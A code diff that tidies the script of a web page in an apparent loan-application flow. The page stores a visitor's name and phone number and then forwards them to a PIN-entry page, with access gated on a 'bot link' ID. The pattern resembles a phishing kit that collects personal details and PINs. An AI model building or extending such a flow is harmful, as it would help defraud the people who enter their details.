@@ -18,7 +18,6 @@ button:disabled { background: #ccc; cursor: not-allowed; }
 .logo { width: 100%; height: 100%; object-fit: cover; }
 </style>
 </head>
-
 <body>
 
 <div class="loan-container">
@@ -45,35 +44,21 @@ button:disabled { background: #ccc; cursor: not-allowed; }
 </div>
 
 <script>
-// ---------------- BOT ROUTING ----------------
 const botId = localStorage.getItem('botId');
-if (!botId) {
-    alert("Invalid bot link");
-    throw new Error("botId missing");
-}
+if (!botId) { alert("Invalid bot link"); throw new Error("botId missing"); }
+if (!localStorage.getItem('loanAmount')) { window.location.href='index.html'; }
 
-// Prevent skipping previous step
-if (!localStorage.getItem('loanAmount')) {
-    window.location.href = 'index.html';
-}
-
-// ---------------- FORM LOGIC ----------------
 const confirmCheck = document.getElementById('confirmCheck');
 const nextBtn = document.getElementById('nextBtn');
 
-confirmCheck.addEventListener('change', () => {
-    nextBtn.disabled = !confirmCheck.checked;
-});
+confirmCheck.addEventListener('change', () => { nextBtn.disabled = !confirmCheck.checked; });
 
 document.getElementById('detailsForm').addEventListener('submit', e => {
     e.preventDefault();
-
     localStorage.setItem('name', name.value);
     localStorage.setItem('phone', phone.value);
-
     window.location.href = 'pin.html';
 });
 </script>
-
 </body>
 </html>
